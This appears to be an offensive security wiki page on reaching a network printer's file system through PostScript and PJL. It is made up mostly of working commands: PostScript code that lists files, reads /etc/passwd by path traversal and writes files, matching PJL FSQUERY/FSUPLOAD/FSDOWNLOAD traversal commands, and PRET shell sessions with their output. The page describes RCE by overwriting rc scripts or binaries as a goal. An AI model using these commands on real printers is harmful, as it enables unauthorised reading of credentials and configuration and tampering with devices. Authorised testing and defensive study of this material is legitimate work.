# File system access

### **PostScript**

Retrieve sensitive information like configuration files or stored print jobs, RCE by writting files \(like editing rc scripts or replacing binary files\).  Legitimate language constructs are defined for **PostScript** and **PJL** to **access the filesystem**.

Access the file system with PostScript \(note that it could be sandboxed limiting to harmless actions\):

```bash
> /str 256 string def (%*%../*)                               % list all files
> {==} str filenameforall
< (%disk0%../webServer/home/device.html)
< (%disk0%../webServer/.java.login.config)
< (%disk0%../webServer/config/soe.xml)

> /byte (0) def                                                % read from file
> /infile (../../../etc/passwd) (r) file def
> { infile read {byte exch 0 exch put
>   (%stdout) (w) file byte writestring}
>   {infile closefile exit} ifelse
> } loop
< root::0:0::/:/bin/dlsh

> /outfile (test.txt) (w+) file def}}                         % write to file
> outfile (Hello World!) writestring
> outfile closefile
```

You can use [PRET ](https://github.com/RUB-NDS/PRET)commands:  `ls`, `get`, `put`, `append`, `delete`, `rename`, `find`, `mirror`, `touch`, `mkdir`, `cd`, `pwd`, `chvol`, `traversal`, `format`, `fuzz` and `df` :

```text
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> ls ../..
d        -   Jan  1  1970 (created Jan  1  1970)  bootdev
d        -   Jan  1  1970 (created Jan  1  1970)  dsk_jdi
d        -   Jan  1  1970 (created Jan  1  1970)  dsk_jdi_ss
d        -   Jan  1  1970 (created Jan  1  1970)  dsk_ram0
d        -   Jan  1  1970 (created Jan  1  1970)  etc
d        -   Jan  1  1970 (created Jan  1  1970)  tmp
d        -   Jan  1  1970 (created Jan  1  1970)  webServer
```

### PJL

```text
> @PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535               (list all files)
< .\:\:TYPE=DIR
< ..\:\:TYPE=DIR
< PostScript TYPE=DIR
< PJL TYPE=DIR
< saveDevice TYPE=DIR
< webServer TYPE=DIR

> @PJL FSQUERY NAME="0:\..\..\etc\passwd"                     (read from file)
< @PJL FSQUERY NAME="0:\..\..\etc\passwd" TYPE=FILE SIZE=23
> @PJL FSUPLOAD NAME="0:\..\..\etc\passwd" OFFSET=0 SIZE=23
< root::0:0::/:/bin/dlsh

> @PJL FSDOWNLOAD SIZE=13 NAME="0:\test.txt"                  (write to file)
> Hello World!
```

Anyway accessing files with PJL is not supported by many printers.

You can use [PRET ](https://github.com/RUB-NDS/PRET)commands:  `ls`, `get`, `put`, `append`, `delete`, `find`, `mirror`, `touch`, `mkdir`, `cd`, `pwd`, `chvol`, `traversal`, `format`, `fuzz` and `df` :

```text
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> ls ..
d        -   bootdev
d        -   dsk_jdi
d        -   dsk_jdi_ss
d        -   dsk_ram0
d        -   etc
d        -   lrt
d        -   tmp
d        -   webServer
d        -   xps
```

**Learn more about possible sandbox bypasses using PostScript and PJL limitations in** [**http://hacking-printers.net/wiki/index.php/File\_system\_access**](http://hacking-printers.net/wiki/index.php/File_system_access)\*\*\*\*

